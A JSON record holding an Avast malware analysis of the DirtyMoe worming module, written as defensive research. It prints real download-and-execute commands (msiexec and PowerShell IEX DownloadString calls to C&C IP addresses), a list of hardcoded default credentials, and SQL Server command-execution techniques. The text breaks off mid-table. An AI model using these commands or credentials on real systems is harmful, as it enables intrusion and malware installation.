{
    "id": "100ccf10-327c-4f0d-957a-7e21ac3ee661",
    "created_at": "2023-01-12T15:01:51.928637Z",
    "updated_at": "2025-03-27T02:11:47.720783Z",
    "deleted_at": null,
    "sha1_hash": "7debde5bc96efd518c3a26963d94c0392b0b52d6",
    "title": "2022-03-16 - DirtyMoe- Worming Modules",
    "authors": "",
    "file_creation_date": "2022-05-27T22:37:37Z",
    "file_modification_date": "2022-05-27T22:37:37Z",
    "file_size": 1139687,
    "plain_text": "# DirtyMoe: Worming Modules\n\n**decoded.avast.io/martinchlumecky/dirtymoe-5/**\n\nby [Martin ChlumeckýMarch 16, 202233 min read](https://decoded.avast.io/author/martinchlumecky/)\n\n\nMarch 16, 2022\n\n\nThe DirtyMoe malware is deployed using various kits like PurpleFox or injected installers of\nTelegram Messenger that require user interaction. Complementary to this deployment, one\nof the DirtyMoe modules expands the malware using worm-like techniques that require no\nuser interaction.\n\nThis research analyzes this worming module’s kill chain and the procedures used to\nlaunch/control the module through the DirtyMoe service. Other areas investigated include\nevaluating the risk of identified exploits used by the worm and detailed analysis of how its\nvictim selection algorithm works. Finally, we examine this performance and provide a\nthorough examination of the entire worming workflow.\n\nThe analysis showed that the worming module targets older well-known vulnerabilities, e.g.,\nEternalBlue and Hot Potato Windows Privilege Escalation. Another important discovery is a\ndictionary attack using Service Control Manager Remote Protocol (SCMR), WMI, and MS\nSQL services. Finally, an equally critical outcome is discovering the algorithm that\ngenerates victim target IP addresses based on the worming module’s geographical location.\n\nOne worm module can generate and attack hundreds of thousands of private and public IP\naddresses per day; many victims are at risk since many machines still use unpatched\nsystems or weak passwords. Furthermore, the DirtyMoe malware uses a modular design;\nconsequently, we expect other worming modules to be added to target prevalent\nvulnerabilities.\n\n**1. Introduction**\n\n[DirtyMoe, the successful malware we documented in detail in the previous series, also](https://decoded.avast.io/martinchlumecky/dirtymoe-1/)\nimplements mechanisms to reproduce itself. The most common way of deploying the\nDirtyMoe malware is via phishing campaigns or malvertising. In this series, we will focus on\ntechniques that help DirtyMoe to spread in the wild.\n\n\n-----\n\nThe PurpleFox exploit kit (EK) is the most frequently observed approach to deploy\nDirtyMoe; the immediate focus of PurpleFox EK is to exploit a victim machine and install\nDirtyMoe. PurpleFox EK primarily abuses vulnerabilities in the Internet Explorer browser via\nphishing emails or popunder ads. For example, Guardicore described a worm spread by\nPurpleFox that abuses SMB services with weak passwords [2], infiltrating poorly secured\nsystems. Recently, Minerva Labs has described the new infection vector installing DirtyMoe\nvia an injected Telegram Installer [1].\n\nCurrently, we are monitoring three approaches used to spread DirtyMoe in the wild; Figure\n**1 illustrates the relationship between the individual concepts. The primary function of the**\nDirtyMoe malware is crypto-mining; it is deployed to victims’ machines using different\ntechniques. We have observed PurpleFox EK, PurleFox Worm, and injected Telegram\nInstallers as mediums to spread and install DirtyMoe; we consider it highly likely that other\nmechanisms are used in the wild.\n\n**Figure 1. Mediums of DirtyMoe**\nIn the [fourth series on this malware family, we described the deployment of the DirtyMoe](https://decoded.avast.io/martinchlumecky/dirtymoe-4/)\nservice. Figure 2 illustrates the DirtyMoe hierarchy. The DirtyMoe service is run as a\n```\nsvchost process that starts two other processes: DirtyMoe Core and Executioner, which\n\n```\nmanages DirtyMoe modules. Typically, the executioner loads two modules; one for Monero\nmining and the other for worming replication.\n\n\n-----\n\n**Figure 2. DirtyMoe hierarchy**\nOur research has been focused on worming since it seems that worming is one of the main\nmediums to spread the DirtyMoe malware. The PurpleFox worm described by Guardicore\n\n[2] is just the tip of the worming iceberg because DirtyMoe utilizes sophisticated algorithms\nand methods to spread itself into the wild and even to spread laterally in the local network.\n\nThe goal of the DirtyMoe worm is to exploit a target system and install itself into a victim\nmachine. The DirtyMoe worm abuses several known vulnerabilities as follow:\n```\n   CVE:2019-9082 : ThinkPHP – Multiple PHP Injection RCEs\n   CVE:2019-2725 : Oracle Weblogic Server – ‘AsyncResponseService’ Deserialization\n\n```\nRCE\n```\n   CVE:2019-1458 : WizardOpium Local Privilege Escalation\n   CVE:2018-0147 : Deserialization Vulnerability\n   CVE:2017-0144 : EternalBlue SMB Remote Code Execution (MS17-010)\n   MS15-076 : RCE Allow Elevation of Privilege (Hot Potato Windows Privilege\n\n```\nEscalation)\n```\n   Dictionary attacks to MS SQL Servers, SMB, and Windows Management\n\n```\nInstrumentation (WMI)\n\nThe prevalence of DirtyMoe is increasing in all corners of the world; this may be due to the\nDirtyMoe worm’s strategy of generating targets using a pseudo-random IP generator that\nconsiders the worm’s geological and local location. A consequence of this technique is that\nthe worm is more flexible and effective given its location. In addition, DirtyMoe can be\nexpanded to machines hidden behind NAT as this strategy also provides lateral movement\nin local networks. A single DirtyMoe instance can generate and attack up to 6,000 IP\naddresses per second.\n\n\n-----\n\nThe insidiousness of the whole worm s design is its modularization controlled by C&C\nservers. For example, DirtyMoe has a few worming modules targeting a specific\nvulnerability, and C&C determines which worming module will be applied based on\ninformation sent by a DirtyMoe instance.\n\nThe DirtyMoe worming module implements three basic phases common to all types of\nvulnerabilities. First, the module generates a list of IP addresses to target in the initial\nphase. Then, the second phase attacks specific vulnerabilities against these targets. Finally,\nthe module performs dictionary attacks against live machines represented by the randomly\ngenerated IP addresses. The most common modules that we have observed are SMB and\nSQL.\n\nThis article focuses on the DirtyMoe worming module. We analyze and discuss the worming\nstrategy, which exploits are abused by the malware author, and a module behavior\naccording to geological locations. One of the main topics is the performance of IP address\ngeneration, which is crucial for the malware’s success. We are also looking for specific\nimplementations of abused exploits, including their origins.\n\n**2. Worm Kill Chain**\n\nWe can describe the general workflow of the DirtyMoe worming module through the kill\nchain. Figure 3 illustrates stages of the worming workflow.\n\n**Figure 3. Worming module workflow**\n**Reconnaissance**\n\nThe worming module generates targets at random but also considers the geolocation of the\nmodule. Each generated target is tested for the presence of vulnerable service versions; the\nmodule connects to the specific port where attackers expect vulnerable services and\nverifies whether the victim’s machine is live. If the verification is successful, the worming\nmodule collects basic information about the victim’s OS and versions of targeted services.\n\n**Weaponization**\n\nThe C&C server appears to determine which specific module is used for worming without\nusing any victim’s information. Currently, we do not precisely know what algorithm is used\nfor module choice but suspect it depends on additional information sent to the C&C server.\n\n\n-----\n\nWhen the module verifies that a targeted victim s machine is potentially exploitable, an\nappropriate payload is prepared, and an attack is started. The payload must be modified for\neach attack since a remote code execution (RCE) command is valid only for a few minutes.\n\n**Delivery**\nIn this kill chain phase, the worming module sends the prepared payload. The payload\ndelivery is typically performed using protocols of targeted services, e.g., SMB or MS SQL\nprotocols.\n\n**Exploitation and Installation**\nIf the payload is correct and the victim’s machine is successfully exploited, the RCE\ncommand included in the payload is run. Consequently, the DirtyMoe malware is deployed,\n[as was detailed in the previous article (DirtyMoe: Deployment).](https://decoded.avast.io/martinchlumecky/dirtymoe-4/)\n\n**3. RCE Command**\n\nThe main goal of the worming module is to achieve RCE under administrator privileges and\ninstall a new DirtyMoe instance. The general form of the executed command ( @RCE@ ) is\nthe same for each worming module:\n\n```\nCmd /c for /d %i in (@WEB@) do Msiexec /i http://%i/@FIN@ /Q\n\n```\n\nThe command usually iterates through three IP addresses of C&C servers, including ports.\nIPs are represented by the placeholder `@WEB@ filled on runtime. Practically,` `@WEB@ is`\nregenerated for each payload sent since the IPs are rotated every minute utilizing\n[sophisticated algorithms; this was described in Section 2 of the first blog.](https://decoded.avast.io/martinchlumecky/dirtymoe-1/)\n\nThe second placeholder is `@FIN@ representing the DirtyMoe object’s name; this is, in fact,`\nan MSI installer package. The package filename is in the form of a hash – `[A-F0-9]`\n```\n{8}\\.moe . The hash name is generated using a hardcoded hash table, methods for\n\n```\nrotations and substrings, and by the `MS_RPC_<n> string, where` `n is a number`\ndetermined by the DirtyMoe service.\n\nThe core of the `@RCE@ command is the execution of the remote DirtyMoe object`\n( http:// ) via `msiexec in silent mode ( /Q ). An example of a specific` `@RCE@`\ncommand is:\n```\nCmd /c for /d %i in (45.32.127.170:16148 92.118.151.102:19818\n207.246.118.120:11410) do Msiexec /i http://%i/6067C695.moe /Q\n\n```\n**4. IP Address Generation**\n\nThe key feature of the worming module is the generation of IP addresses (IPs) to attack.\nThere are six methods used to generate IPs with the help of a pseudo-random generator;\neach method focuses on a different IPv4 Class. Accordingly, this factor contributes to the\nglobally uniform distribution of attacked machines and enables the generation of more\nusable IP addresses to target.\n\n\n-----\n\n4.1 Class B from IP Table\n\nThe most significant proportion of generated addresses is provided by 10 threads\ngenerating IPs using a hardcoded list of 24,622 items. Each list item is in form\n```\n0xXXXX0000, representing IPs of Class B. Each thread generates IPs based on the\n\n```\nalgorithms as follows:\n\nThe algorithm randomly selects a Class B address from the list and 65,536 times generates\nan entirely random number that adds to the selected Class B addresses. The effect is that\nthe final IP address generated is based on the geological location hardcoded in the list.\n\n**Figure 4 shows the geological distribution of hardcoded addresses. The continent**\ndistribution is separated into four parts: Asia, North America, Europe, and others (South\nAmerica, Africa, Oceania). We verified this approach and generated 1M addresses using\nthe algorithm. The result has a similar continental distribution. Hence, the implementation\nensures that the IP addresses distribution is uniform.\n\n\n-----\n\n**Figure 4. Geological distribution of hardcoded class B IPs**\n4.2 Fully Random IP\n\nThe other three threads generate completely random IPs, so the geological position is also\nentirely random. However, the full random IP algorithm generates low classes more\nfrequently, as shown in the algorithm below.\n\n4.3 Derived Classes A, B, C\n\n\n-----\n\nThree other algorithms generate IPs based on an IP address of a machine (IPm) where the\nworming module runs. Consequently, the worming module targets machines in the nearby\nsurroundings.\n\nAddresses are derived from the IPm masked to the appropriate Class A/B/C, and a random\nnumber representing the lower Class is added; as shown in the following pseudo-code.\n\n4.4 Derived Local IPs\n\nThe last IP generating method is represented by one thread that scans interfaces attached\nto local networks. The worming module lists local IPs using `gethostbyname() and`\nprocesses one local address every two hours.\n\nEach local IP is masked to Class C, and 255 new local addresses are generated based on\nthe masked address. As a result, the worming module attacks all local machines close to\nthe infected machine in the local network.\n\n**5. Attacks to Abused Vulnerabilities**\n\n\n-----\n\nWe have detected two worming modules which primarily attack SMB services and MS SQL\ndatabases. Our team has been lucky since we also discovered something rare: a worming\nmodule containing exploits targeting PHP, Java Deserialization, and Oracle Weblogic\nServer that was still under development. In addition, the worming modules include a packed\ndictionary of 100,000-words used with dictionary attacks.\n\n5.1 EternalBlue\n\nOne of the main vulnerabilities is `CVE:2017-0144 : EternalBlue SMB Remote Code`\nExecution (patched by Microsoft in MS17-010). It is still bewildering how many EternalBlue\nattacks are still observed – Avast is still blocking approximately 20 million attempts for the\nEternalBlue attack every month.\n\nThe worming module focuses on the Windows version from Windows XP to Windows 8. We\nhave identified that the EternalBlue implementation is the same as described in exploit-db\n\n[3], and an effective payload including the `@RCE@ command is identical to DoublePulsar`\n\n[4]. Interestingly, the whole EternalBlue payload is hardcoded for each Windows\narchitecture, although the payload can be composed for each platform separately.\n\n5.2 Service Control Manager Remote Protocol\n\nNo known vulnerability is used in the case of Service Control Manager Remote Protocol\n(SCMR) [5]. The worming module attacks SCMR through a dictionary attack. The first\nphase is to guess an administrator password. The details of the dictionary attack are\ndescribed in Section 6.4.\n\nIf the dictionary attack is successful and the module guesses the password, a new Windows\nservice is created and started remotely via RPC over the SMB service. Figure 5 illustrates\nthe network communication of the attack. Binding to the SCMR is identified using UUID\n```\n{367ABB81-9844-35F1-AD32- 98F038001003} . On the server-side, the worming module\n\n```\nas a client writes commands to the `\\PIPE\\svcctl pipe. The first batch of commands`\ncreates a new service and registers a command with the malicious `@RCE@ payload. The`\nnew service is started and is then deleted to attempt to cover its tracks.\n\nThe Microsoft HTML Application Host ( mshta.exe ) is used as a LOLbin to execute and\ncreate ShellWindows and run `@RCE@ . The advantage of this proxy execution is that`\n```\nmshta.exe is typically marked as trusted; some defenders may not detect this misuse of\nmshta.exe .\n\n```\n\n-----\n\n**Figure 5. SCMR network communications**\nWindows Event records these suspicious events in the System log, as shown in Figure 6.\nThe service name is in the form `AC<number>, and the` `number is incremented for each`\nsuccessful attack. It is also worth noting that `ImagePath contains the` `@RCE@ command`\nsent to SCMR in `BinaryPathName, see Figure 5.`\n\n**Figure 6. Event log for SCMR**\n5.3 Windows Management Instrumentation\n\nThe second method that does not misuse any known vulnerability is a dictionary attack to\nWindows Management Instrumentation (WMI). The workflow is similar to the SCMR attack.\nFirstly, the worming module must also guess the password of a victim administrator\naccount. The details of the dictionary attack are described in Section 6.4.\n\nThe attackers can use WMI to manage and access data and resources on remote\ncomputers [6]. If they have an account with administrator privileges, full access to all system\nresources is available remotely.\n\nThe malicious misuse lies in the creation of a new process that runs `@RCE@ via a WMI`\nscript; see Figure 7. DirtyMoe is then installed in the following six steps:\n\n\n-----\n\n1. Initialize the COM library.\n2. Connect to the default namespace `root/cimv2 containing the WMI classes for`\n\nmanagement.\n3. The `Win32_Process class is created, and` `@RCE@ is set up as a command-line`\n\nargument.\n4. `Win32_ProcessStartup represents the startup configuration of the new process.`\n\nThe worming module sets a process window to a hidden state, so the execution is\ncomplete silently.\n5. The new process is started, and the DirtyMoe installer is run.\n6. Finally, the WMI script is finished, and the COM library is cleaned up.\n\n**Figure 7. WMI scripts creating Win32_Process lunching the @RCE@ command**\n5.4 Microsoft SQL Server\n\nAttacks on Microsoft SQL Servers are the second most widespread attack in terms of\nworming modules. Targeted MS SQL Servers are 2000, 2005, 2008, 2012, 2014, 2016,\n2017, 2019.\n\nThe worming module also does not abuse any vulnerability related to MS SQL. However, it\nuses a combination of the dictionary attack and `MS15-076 : “RCE Allow Elevation of`\nPrivilege” known as “Hot Potato Windows Privilege Escalation”. Additionally, the malware\nauthors utilize the `MS15-076 implementation known as Tater, the PowerSploit function`\nInvoke-ReflectivePEInjection, and `CVE-2019-1458 : “WizardOpium Local Privilege`\nEscalation” exploit.\n\n\n-----\n\nThe first stage of the MS SQL attack is to guess the password of an attacked MS SQL\nserver. The first batch of username/password pairs is hardcoded. The malware authors\nhave collected the hardcoded credentials from publicly available sources. It contains fifteen\ndefault passwords for a few databases and systems like Nette Database, Oracle, Firebird,\nKingdee KIS, etc. The complete hardcoded credentials are as follows: `401hk/401hk_@_,`\n```\nadmin/admin, bizbox/bizbox, bwsa/bw99588399, hbv7/zXJl@mwZ,\nkisadmin/ypbwkfyjhyhgzj, neterp/neterp, ps/740316, root/root, sp/sp,\nsu/t00r_@_, sysdba/masterkey, uep/U_tywg_2008, unierp/unierp, vice/vice .\n\n```\nIf the first batch is not successful, the worming module attacks using the hardcoded\ndictionary. The detailed workflow of the dictionary attack is described in Section 6.4.\n\nIf the module successfully guesses the username/password of the attacked MS SQL server,\nthe module executes corresponding payloads based on the Transact-SQL procedures.\nThere are five methods launched one after another.\n\n1. sp_start_job\n\nThe module creates, schedules, and immediately runs a task with Payload 1.\n2. sp_makewebtask\n\nThe module creates a task that produces an HTML document containing Payload 2.\n3. sp_OAMethod\n\nThe module creates an OLE object using the VBScript “WScript.Shell“ and runs\n**Payload 3.**\n4. xp_cmdshell\n\nThis method spawns a Windows command shell and passes in a string for execution\nrepresented by Payload 3.\n5. Run-time Environment\n\n**Payload 4 is executed as a .NET assembly.**\n\nIn brief, there are four payloads used for the DirtyMoe installation. The SQL worming\nmodule defines a placeholder `@SQLEXEC@ representing a full URL to the MSI installation`\npackage located in the C&C server. If any of the payloads successfully performed a\nprivilege escalation, the DirtyMoe installation is silently launched via MSI installer; see our\n[DirtyMoe Deployment blog post for more details.](https://decoded.avast.io/martinchlumecky/dirtymoe-4/)\n\n**Payload 1**\n\nThe first payload tries to run the following PowerShell command:\n```\npowershell -nop -exec bypass -c \"IEX $decoded; MsiMake @SQLEXEC@;\"\n\n```\nwhere `$decoded contains the` `MsiMake functions, as is illustrated in Figure 8. The`\nfunction calls `MsiInstallProduct function from` `msi.dll as a completely silent`\ninstallation (INSTALLUILEVEL_NONE) but only if the MS SQL server runs under\nadministrator privileges.\n\n\n-----\n\n**Figure 8. MsiMake function**\n**Payload 2**\n\nThe second payload is used only for sp_makewebtask execution; the payload is written to\nthe following autostart folders:\n```\nC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\1.hta\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.hta\n\n```\n**Figure 9 illustrates the content of the** `1.hta file camouflaged as an HTML file. It is evident`\nthat DirtyMoe may be installed on each Windows startup.\n\n\n-----\n\n**Figure 9. ActiveX object runs via sp_makewebtask**\n**Payload 3**\n\nThe last payload is more sophisticated since it targets the vulnerabilities and exploits\nmentioned above. Firstly, the worming module prepares a `@SQLPSHELL@ placeholder`\ncontaining a full URL to the DirtyMoe object that is the adapted version of the Tater\nPowerShell script.\n\nThe first stage of the payload is a powershell command:\n```\npowershell -nop -exec bypass -c \"IEX (New-Object\nNet.WebClient).DownloadString(''@SQLPSHELL@''); MsiMake @SQLEXEC@\"\n\n```\n\n-----\n\nThe adapted Tater script implements the extended `MsiMake function. The script attempts`\nto install DirtyMoe using three different ways:\n\n1. Install DirtyMoe via the `MsiMake implementation captured in Figure 8.`\n2. Attempt to exploit the system using `Invoke-ReflectivePEInjection with the`\n\nfollowing arguments:\n\n```\nInvoke-ReflectivePEInjection -PEBytes $Bytes -ExeArgs $@RCE@ \n```\n```\n ForceASLR\n\n```\nwhere `$Bytes is the implementation of` `CVE-2019-1458 that is included in the`\nscript.\n3. The last way is installation via the Tater command:\n\n```\nInvoke-Tater -Command $@RCE@\n\n```\n\nThe example of Payload 3 is:\n```\npowershell -nop -exec bypass -c \"IEX (New-ObjectNet.\nWebClient).DownloadString(\n'http://108.61.184.105:20114/57BC9B7E.Png'); MsiMake\nhttp://108.61.184.105:20114/0CFA042F.Png\n\n```\n**Payload 4**\n\nThe attackers use .NET to provide a run-time environment that executes an arbitrary\ncommand under the MS SQL environment. The worming module defines a new assembly\n.NET procedure using Common Language Runtime (CLR), as Figure 10 demonstrates.\n\n**Figure 10. Payload 4 is defined as**\n\n.Net Assembly\nThe .NET code of Payload 4 is a simple class defining a SQL procedure `ExecCommand`\nthat runs a malicious command using the `Process class; shown in Figure 11.`\n\n\n-----\n\n**Figure 11. .Net code executing malicious commands**\n5.5 Development Module\n\nWe have discovered one worming module containing artifacts that indicate that the module\nis in development. This module does not appear to be widespread in the wild, and it may\ngive insight into the malware authors’ future intentions. The module contains many hardcoded sections in different states of development; some sections do not hint at the `@RCE@`\nexecution.\n\n**PHP**\n\n```\nCVE:2019-9082: ThinkPHP - Multiple PHP Injection RCEs.\n\n```\n\nThe module uses the exact implementation published at [7]; see Figure 12. In short, a CGI\nscript that verifies the ability of `call_user_func_array is sent. If the verification is`\npassed, the CGI script is re-sent with `@RCE@ .`\n\n\n-----\n\n**Figure 12.**\n\n\nCVE:2019-9082: ThinkPHP\n**Deserialization**\n\n```\nCVE:2018-0147: Deserialization Vulnerability\n\n```\n\nThe current module implementation executes a malicious Java class [8], shown in Figure\n**13, on an attacked server. The** `RunCheckConfig class is an executioner for accepted`\nconnections that include a malicious serializable object.\n\n**Figure 13. Java class RunCheckConfig executing arbitrary commands**\nThe module prepares the serializable object illustrated in Figure 14 that the\n```\nRunCheckConfig class runs when the server accepts this object through the HTTP POST\n\n```\nmethod.\n\n\n-----\n\n**Figure 14. Deserialized object including @RCE@**\nThe implementation that delivers the `RunCheckConfig class into the attacked server`\nabused the same vulnerability. It prepares a serializable object executing\n```\nObjectOutputStream, which writes the RunCheckConfig class into c:/windows/tmp .\n\n```\nHowever, this implementation is not included in this module, so we assume that this module\nis still in development.\n\n**Oracle Weblogic Server**\n```\nCVE:2019-2725: Oracle Weblogic Server - 'AsyncResponseService'\nDeserialization RCE\n\n```\nThe module again exploits vulnerabilities published at [9] to send malicious SOAP payloads\nwithout any authentication to the Oracle Weblogic Server T3 interface, followed by sending\nadditional SOAP payloads to the WLS AsyncResponseService interface.\n\nSOAP\n\nThe SOAP request defines the `WorkContext as` `java.lang.Runtime with three`\narguments. The first argument defines which executable should be run. The following\n\n\n-----\n\narguments determine parameters for the executable. An example of the `WorkContext is`\nshown in Figure 15.\n\n**Figure 15. SOAP request for Oracle Weblogic Server**\nHardcoded SOAP commands are not related to `@RCE@ ; we assume that this`\nimplementation is also in development.\n\n**6. Worming Module Execution**\n\nThe worming module is managed by the DirtyMoe service, which controls its configuration,\ninitialization, and worming execution. This section describes the lifecycle of the worming\nmodule.\n\n6.1 Configuration\n\nThe DirtyMoe service contacts one of the C&C servers and downloads an appropriate\nworming module into a Shim Database (SDB) file located at\n```\n%windir%\\apppatch\\TK<volume-id>MS.sdb . The worming module is then decrypted and\n\n```\ninjected into a new `svchost.exe process, as` **Figure 2 illustrates.**\n\nThe encrypted module is a PE executable that contains additional placeholders. The\nDirtyMoe service passes configuration parameters to the module via these placeholders.\nThis approach is identical to other DirtyMoe modules; however, some of the placeholders\nare not used in the case of the worming module.\n\nThe placeholders overview is as follows:\n```\n   @TaskGuid@ : N/A in worming module\n   @IPsSign@ : N/A in worming module\n   @RunSign@ : Mutex created by the worming module that is controlled by the DirtyMoe\n\n```\nservice\n```\n   @GadSign@ : ID of DirtyMoe instance registered in C&C\n   @FixSign@ : Type of worming module, e.g, ScanSmbHs5\n   @InfSign@ : Worming module configuration\n\n```\n6.2 Initialization\n\n\n-----\n\nWhen the worming module, represented by the new process, is injected and resumed by\nthe DirtyMoe service, the module initialization is invoked. Firstly, the module unpacks a\nword dictionary containing passwords for a dictionary attack. The dictionary consists of\n100,000 commonly used passwords compressed using LZMA. Secondly, internal structures\nare established as follows:\n\n**IP Address Backlog**\nThe module stores discovered IP addresses with open ports of interest. It saves the IP\naddress and the timestamp of the last port check.\n\n**Dayspan and Hourspan Lists**\nThese lists manage IP addresses and their insertion timestamps used for the dictionary\nattack. The IP addresses are picked up based on a threshold value defined in the\nconfiguration. The IP will be processed if the IP address timestamp surpasses the threshold\nvalue of the day or hour span. If, for example, the threshold is set to 1, then if a day/hour\nspan of the current date and a timestamp is greater than 1, a corresponding IP will be\nprocessed. The Dayspan list registers IPs generated by Class B from IP Table, Fully\nRandom IP, and Derived Classes A methods; in other words, IPs that are further away from\nthe worming module location. On the other hand, the Hourspan list records IPs located\ncloser.\n\nThirdly, the module reads its configuration described by the `@InfSign@ placeholder. The`\nconfiguration matches this pattern: `<IP>|<PNG_ID>|<timeout>|`\n```\n[SMB:HX:PX1.X2.X3:AX:RX:BX:CX:DX:NX:SMB]\n   IP is the number representing the machine IP from which the attack will be carried\n\n```\nout. The IP is input for the methods generating IPs; see Section 4. If the IP is not\navailable, the default address `98.126.89.1 is used.`\n```\n   PNG_ID is the number used to derive the hash-name that mirrors the DirtyMoe object\n\n```\nname (MSI installer package) stored at C&C. The hashname is generated using\n\n`MS_RPC_<n> string where` `n is` `PNG_ID ; see` Section 3.\n```\n   Timeout is the default timeout for connections to the attacked services in seconds.\n   HX is a threshold for comparing IP timestamps stored in the Dayspan and Hourspan\n\n```\n_lists. The comparison ascertains whether an IP address will be processed if the_\ntimestamp of the IP address exceeds the day/hour threshold.\n\n\n-----\n\n```\n   P is the flag for the dictionary attack.\n      X1 number determines how many initial passwords will be used from the\n\n```\npassword dictionary to increase the probability of success – the dictionary\ncontains the most used passwords at the beginning.\n```\n      X2 number is used for the second stage of the dictionary attack if the first X1\n\n```\npasswords are unsuccessful. Then the worming module tries to select `X2`\npasswords from the dictionary randomly.\n```\n      X3 number defines how many threads will process the Dayspan and Hourspan\n\n```\n_lists; more precisely, how many threads will attack the registered IP addresses in_\nthe Dayspan/Hourspan lists.\n```\n   AX : how many threads will generate IP addresses using Class B from IP Table\n\n```\nmethods.\n```\n   RX : how many threads for the Fully Random IP method.\n   BX, CX, DX : how many threads for the Derived Classes A, B, C methods.\n   NX defines a thread quantity for the Derived Local IPs method.\n\n```\nThe typical configuration can be `217.xxx.xxx.xxx|5|2|`\n```\n[SMB:H1:P1.30.3:A10:R3:B3:C3:D1:N3:SMB]\n\n```\nFinally, the worming module starts all threads defined by the configuration, and the worming\nprocess and attacks are started.\n\n6.3 Worming\n\nThe worming process has five phases run, more or less, in parallel. Figure 16 has an\nanimation of the worming process.\n\n\n-----\n\n**Figure 16. Worming module workflow**\n**Phase 1**\n\nThe worming module usually starts 23 threads generating IP addresses based on Section\n4. The IP addresses are classified into two groups: day-span and hour-span.\n\n**Phase 2**\n\nThe second phase runs in parallel with the first; its goal is to test generated IPs. Each\nspecific module targets defined ports that are verified via sending a zero-length transport\ndatagram. If the port is active and ready to receive data, the IP address of the active port is\nadded to IP Address Backlog. Additionally, the SMB worming module immediately tries the\nEternalBlue attack within the port scan.\n\n**Phase 3**\n\nThe IP addresses verified in Phase 2 are also registered into the Dayspan and Hourspan\n_lists. The module keeps only 100 items (IP addresses), and the lists are implemented as a_\nqueue. Therefore, some IPs can be removed from these lists if the IP address generation is\ntoo fast or the dictionary attacks are too slow. However, the removed addresses are still\npresent in the IP Address Backlog.\n\n**Phase 4**\n\n\n-----\n\nThe threads created based on the X3 configuration parameters process and manage the\nitems (IPs) of Dayspan and Hourspan lists. Each thread picks up an item from the\ncorresponding list, and if the defined day/hour threshold (HX parameter) is exceeded, the\nmodule starts the dictionary attack to the picked-up IP address.\n\n**Phase 5**\n\nEach generated and verified IP is associated with a timestamp of creation. The last phase is\nactivated if the previous timestamp is older than 10 minutes, i.e., if the IP generation is\nsuspended for any reason and no new IPs come in 10 minutes. Then one dedicated thread\nextracts IPs from the backlog and processes these IPs from the beginning; These IPs are\nprocessed as per Phase 2, and the whole worming process continues.\n\n6.4 Dictionary Attack\n\nThe dictionary attack targets two administrator user names, namely `administrator for`\nSMB services and `sa for MS SQL servers. If the attack is successful, the worming module`\ninfiltrates a targeted system utilizing an attack series composed of techniques described in\nSection 5:\n\nService Control Manager Remote Protocol (SCMR)\nWindows Management Instrumentation (WMI)\nMicrosoft SQL Server (SQL)\n\nThe first attack attempt is sent with an empty password. The module then addresses three\nstates based on the attack response as follows:\n\nNo connection: the connection was not established, although a targeted port is open –\na targeted service is not available on this port.\nUnsuccessful: the targeted service/system is available, but authentication failed due to\nan incorrect username or password.\nSuccess: the targeted service/system uses the empty password.\n\n**Administrator account has an empty password**\n\nIf the administrator account is not protected, the whole worming process occurs quickly (this\nis the best possible outcome from the attacker’s point of view). The worming module then\nproceeds to infiltrate the targeted system with the attack series (SCMR, WMI, SQL) by\nsending the empty password.\n\n**Bad username or authentication information**\n\nA more complex situation occurs if the targeted services are active, and it is necessary to\nattack the system by applying the password dictionary.\n\nCleverly, the module stores all previously successful passwords in the system registry; the\nfirst phase of the dictionary attack iterates through all stored passwords and uses these to\nattack the targeted system. Then, the attack series (SCMR, WMI, SQL) is started if the\n\n\n-----\n\npassword is successfully guessed.\n\nThe second phase occurs if the stored registry passwords yield no success. The module\nthen attempts authentication using a defined number of initial passwords from the password\ndictionary. This number is specified by the X1 configuration parameters (usually X1*100). If\nthis phase is successful, the guessed password is stored in the system registry, and the\nattack series is initiated.\n\nThe final phase follows if the second phase is not successful. The module randomly\nchooses a password from a dictionary subset X2*100 times. The subset is defined as the\noriginal dictionary minus the first X1*100 items. In case of success, the attack series is\ninvoked, and the password is added to the system registry.\n\nSuccessfully used passwords are stored encrypted, in the following system registry\nlocation:\n```\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\DirectPlay8\\Direct3D\\RegRunInfoBarkIPsInfo\n\n```\n**7. Summary and Discussion**\n\n**Modules**\n\nWe have detected three versions of the DirtyMoe worming module in use. Two versions\nspecifically focus on the SMB service and MS SQL servers. However, the third contains\nseveral artifacts implying other attack vectors targeting PHP, Java Deserialization, and\nOracle Weblogic Server. We continue to monitor and track these activities.\n\n**Attacked Machines**\n\nOne interesting finding is an attack adaptation based on the geological location of the\nworming module. Methods described in Section 4 try to distribute the generated IP\naddresses evenly to cover the largest possible radius. This is achieved using the IP address\nof the worming module itself since half of the threads generating the victim’s IPs are based\non the module IP address. Otherwise, if the IP is not available for some reason, the IP\naddress `98.126.89.1 located in Los Angeles is used as the base address.`\n\nWe performed a few VPN experiments for the following locations: the United States,\nRussian Federation, Czech Republic, and Taiwan. The results are animated in Figure 17;\n**Table 1 records the attack distributions for each tested VPN.**\n\n\n**VPN** **Attack**\n**Distribution**\n\nUnited States North America\n(59%)\n\nEurope (21%)\n\nAsia (16%)\n\n\n**Top countries**\n\nUnited States\n\n\n-----\n\nRussian\nFederation\n\nCzech\nRepublic\n\n\nNorth America\n(41%)\n\nEurope (33%)\n\nAsia (20%)\n\nEurope (56%)\n\nAsia (14%)\n\nSouth America\n(11%)\n\n\nUnited States, Iran, United Kingdom, France,\nRussian Federation\n\nChina, Brazil, Egypt, United States, Germany\n\nUnited States, United Kingdom, Japan, Brazil,\nTurkey\n\n\nTaiwan North America\n(47%)\n\nEurope (22%)\n\nAsia (18%)\n\n\n**Table 1. VPN attack distributions and top countries**\n\n**Figure 17. VPN attack distributions**\n**LAN**\n\nPerhaps the most striking discovery was the observed lateral movement in local networks.\nThe module keeps all successfully guessed passwords in the system registry; these saved\npasswords increase the probability of password guessing in local networks, particularly in\nhome and small business networks. Therefore, if machines in a local network use the same\nweak passwords that can be easily assessed, the module can quickly infiltrate the local\nnetwork.\n\n**Exploits**\n\n\n-----\n\nAll abused exploits are from publicly available resources. We have identified six main\nvulnerabilities summarized in Table 2. The worming module adopts the exact\nimplementation of EternalBlue, ThinkPHP, and Oracle Weblogic Server exploits from\n[exploit-db. In the same way, the module applies and modifies implementations of](https://www.exploit-db.com/)\nDoublePulsar, Tater, and PowerSploit frameworks.\n\n**ID** **Description**\n\n`CVE:2019-` ThinkPHP – Multiple PHP Injection RCEs\n```\n 9082\n\n```\n`CVE:2019-` Oracle Weblogic Server – ‘AsyncResponseService’ Deserialization\n`2725` RCE\n\n`CVE:2019-` WizardOpium Local Privilege Escalation\n```\n 